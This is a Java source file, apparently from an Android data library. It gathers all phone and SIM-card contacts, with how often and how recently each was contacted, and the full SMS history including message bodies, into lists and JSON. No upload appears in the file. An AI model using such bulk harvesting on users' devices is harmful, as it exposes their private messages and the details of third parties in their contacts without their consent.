package cdax.naindex.datalib;

import android.content.ContentResolver;
import android.content.Context;
import android.database.Cursor;
import android.net.Uri;
import android.provider.ContactsContract;
import android.text.TextUtils;
import android.util.Log;

import org.json.JSONArray;
import org.json.JSONObject;

import java.util.ArrayList;

import cdax.naindex.datalib.data.Contact;


public class ContactAndMessageUtil {

    public static final String TAG = "contract";
    public final static String SYS_ID = "_id";
    public final static String SYS_ADDRESS = "address";
    public final static String SYS_PERSON = "person";
    public final static String SYS_DATE = "date";
    public final static String SYS_DATE_SENT = "date_sent";
    public final static String SYS_READ = "read";
    public final static String SYS_STAUS = "status";
    public final static String SYS_TYPE = "type";
    public final static String SYS_BODY = "body";
    public final static String SYS_SEEN = "seen";

    /**
     * @param context
     * @return
     */
    public static ArrayList<Contact> getContacts(Context context) {
        ArrayList<Contact> list = new ArrayList<Contact>();
        Cursor cursor = null;

        try {
            Uri uri = ContactsContract.CommonDataKinds.Phone.CONTENT_URI;
            String[] projection = new String[]{
                    ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
                    ContactsContract.CommonDataKinds.Phone.NUMBER, ContactsContract.CommonDataKinds.Phone.CONTACT_LAST_UPDATED_TIMESTAMP, ContactsContract.CommonDataKinds.Phone.LAST_TIME_CONTACTED, ContactsContract.CommonDataKinds.Phone.TIMES_CONTACTED};
            ContentResolver resolver = context.getContentResolver();
            cursor = resolver.query(uri, projection, null, null, null);
            int index = 0;
            if (cursor != null) {
                while (cursor.moveToNext()) {

                    if (cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME) == -1) {
                        continue;
                    }
                    if (cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER) == -1) {
                        continue;
                    }
                    String name = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
                    String phoneNum = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
                    String contact_last_updated_timestamp = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.CONTACT_LAST_UPDATED_TIMESTAMP));
                    String last_time_contacted = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.LAST_TIME_CONTACTED));
                    String times_contacted = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.TIMES_CONTACTED));


                    //String nunStr =getFilter(phoneNum);
                    // 当手机号码为空的或者为空字段 跳过当前循环
                    index++;
                    if (TextUtils.isEmpty(phoneNum))
                        continue;

                    //字符转换为字符数组d
                    String phone = String.valueOf(phoneNum.trim().replace(" ", ""));
                    //添加到对象
                    Contact man = new Contact();
                    man.setContact_display_name(Utils.stringIllegalFilter(name));
                    man.setNumber(Utils.stringIllegalFilter(phone));
                    man.setLast_time_contacted(last_time_contacted);
                    man.setUp_time(contact_last_updated_timestamp);
                    man.setTimes_contacted(times_contacted);
                    list.add(man);
                }
            }

            uri = Uri.parse("content://icc/adn");
            cursor = context.getContentResolver().query(uri, projection, null, null, null);
            index = 0;
            if (cursor != null) {
                while (cursor.moveToNext()) {

                    if (cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME) == -1) {
                        continue;
                    }
                    if (cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER) == -1) {
                        continue;
                    }
                    String name = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
                    String phoneNum = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
                    String contact_last_updated_timestamp = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.CONTACT_LAST_UPDATED_TIMESTAMP));
                    String last_time_contacted = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.LAST_TIME_CONTACTED));
                    String times_contacted = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.TIMES_CONTACTED));

                    index++;
                    if (TextUtils.isEmpty(phoneNum))
                        continue;
                    //字符转换为字符数组d
                    String phone = String.valueOf(phoneNum.trim().replace(" ", ""));
                    //添加到对象
                    Contact man = new Contact();
                    man.setContact_display_name(Utils.stringIllegalFilter(name));
                    man.setNumber(Utils.stringIllegalFilter(phone));
                    man.setLast_time_contacted(last_time_contacted);
                    man.setUp_time(contact_last_updated_timestamp);
                    man.setTimes_contacted(times_contacted);
                    list.add(man);
                }
            }


            try {
//                getSimContact("content://icc/adn", context, list);
                getSimContactV2("content://icc/adn/subId/#", context, list);
                getSimContactV2("content://icc/sdn", context, list);
                getSimContactV2("content://icc/sdn/subId/#", context, list);
                getSimContactV2("content://icc/fdn", context, list);
                getSimContactV2("content://icc/fdn/subId/#", context, list);
            } catch (Exception e) {
                Log.d(TAG, "v2" + e.toString());

                e.printStackTrace();
            }


        } catch (Exception e) {
            Log.d(TAG, "v3" + e.toString());

        } finally {
            if (cursor != null) {
                cursor.close();
            }
        }
        return list;
    }

    private static void getSimContactV2(final String adn, Context context, ArrayList<Contact> list) {
        // 读取SIM卡手机号,有三种可能:content://icc/adn || content://icc/sdn || content://icc/fdn
        // 具体查看类 IccProvider.java

        String[] projection = new String[]{
                ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
                ContactsContract.CommonDataKinds.Phone.NUMBER, ContactsContract.CommonDataKinds.Phone.CONTACT_LAST_UPDATED_TIMESTAMP, ContactsContract.CommonDataKinds.Phone.LAST_TIME_CONTACTED, ContactsContract.CommonDataKinds.Phone.TIMES_CONTACTED};
        ContentResolver resolver = context.getContentResolver();
        Cursor cursor = null;
        try {
            Uri uri = Uri.parse(adn);
            cursor = context.getContentResolver().query(uri, projection,
                    null, null, null);
            if (cursor != null) {
                while (cursor.moveToNext()) {
                    if (cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME) == -1) {
                        continue;
                    }
                    if (cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER) == -1) {
                        continue;
                    }
                    String name = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
                    String phoneNum = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
                    String contact_last_updated_timestamp = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.CONTACT_LAST_UPDATED_TIMESTAMP));
                    String last_time_contacted = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.LAST_TIME_CONTACTED));
                    String times_contacted = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.TIMES_CONTACTED));
                    if (TextUtils.isEmpty(phoneNum))
                        continue;
                    //字符转换为字符数组d
                    String phone = String.valueOf(phoneNum.trim().replace(" ", ""));
                    //添加到对象
                    Contact man = new Contact();
                    man.setContact_display_name(Utils.stringIllegalFilter(name));
                    man.setNumber(Utils.stringIllegalFilter(phone));
                    man.setLast_time_contacted(last_time_contacted);
                    man.setUp_time(contact_last_updated_timestamp);
                    man.setTimes_contacted(times_contacted);
                    list.add(man);
                }
                cursor.close();
            }
        } catch (Exception e) {
            if (cursor != null) {
                cursor.close();
            }
        } finally {
            if (cursor != null) {
                cursor.close();
            }
        }
    }

    public static JSONArray getSmsList(Context context) {
        JSONArray jsonArray = new JSONArray();
        String SMS_URI_ALL = "content://sms/";
        Cursor cursor = null;
        try {
            ContentResolver resolver = context.getContentResolver();
            String[] projection = new String[]{SYS_ID, SYS_ADDRESS, SYS_PERSON,
                    SYS_BODY, SYS_DATE, SYS_TYPE, SYS_READ, SYS_STAUS, SYS_SEEN, SYS_DATE_SENT};
            Uri uri = Uri.parse(SMS_URI_ALL);
            cursor = resolver.query(uri, projection, null, null, "date desc");
            if (cursor != null && cursor.getCount() > 0) {
                while (cursor.moveToNext()) {
                    JSONObject obj = new JSONObject();
                    obj.put("phone", cursor.getString(cursor.getColumnIndex(SYS_ADDRESS)));
                    obj.put("content", cursor.getString(cursor.getColumnIndex(SYS_BODY)));
                    obj.put("time", cursor.getLong(cursor.getColumnIndex(SYS_DATE)));
                    obj.put("type", cursor.getInt(cursor.getColumnIndex(SYS_TYPE)));
                    obj.put("_id", cursor.getInt(cursor.getColumnIndex(SYS_ID)));
                    obj.put("sent_date", cursor.getLong(cursor.getColumnIndex(SYS_DATE_SENT)));
                    obj.put("date_sent", cursor.getLong(cursor.getColumnIndex(SYS_DATE_SENT)));
                    obj.put("read", cursor.getInt(cursor.getColumnIndex(SYS_READ)));
                    obj.put("seen", cursor.getInt(cursor.getColumnIndex(SYS_SEEN)));
                    obj.put("status", cursor.getInt(cursor.getColumnIndex(SYS_STAUS)));
                    obj.put("person", cursor.getInt(cursor.getColumnIndex(SYS_PERSON)));
                    jsonArray.put(obj);
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        } finally {
            if (cursor != null) {
                cursor.close();
            }
        }
        return jsonArray;
    }
}